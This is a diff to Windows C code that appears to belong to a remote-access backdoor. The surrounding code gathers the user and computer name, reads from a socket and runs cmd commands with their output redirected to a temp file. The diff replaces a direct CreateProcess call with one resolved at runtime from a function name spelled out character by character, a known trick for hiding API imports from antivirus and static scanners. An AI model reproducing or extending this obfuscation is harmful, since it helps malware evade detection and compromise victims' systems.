@@ -19,6 +19,7 @@ typedef BOOL _GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
 typedef BOOL _GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
 typedef UINT _GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
 typedef DWORD _GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
+typedef BOOL _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
 
 #define SOCKET_BUFFER_SIZE 256
 #define SPLIT_STRING_ARRAY_SIZE 16
@@ -309,8 +310,10 @@ WinMain(HINSTANCE hInstance,
 
 			strncat_s(cmdArg, " > ", 3);
 			strncat_s(cmdArg, filePath, strlen(tempPath) + 10);
-	
-			if ( !CreateProcess(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
+
+			char ca_CreateProcessA[] = { 'C','r','e','a','t','e','P','r','o','c','e','s','s','A',0 };
+			_CreateProcessA* f_CreateProcessA = (_CreateProcessA*)GetProcAddress(libraryKernel32, ca_CreateProcessA);
+			if ( !f_CreateProcessA(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
 			{
 				char bufferError[256];
 				sprintf_s(bufferError, "CreateProcess failed (%d).\n", GetLastError());
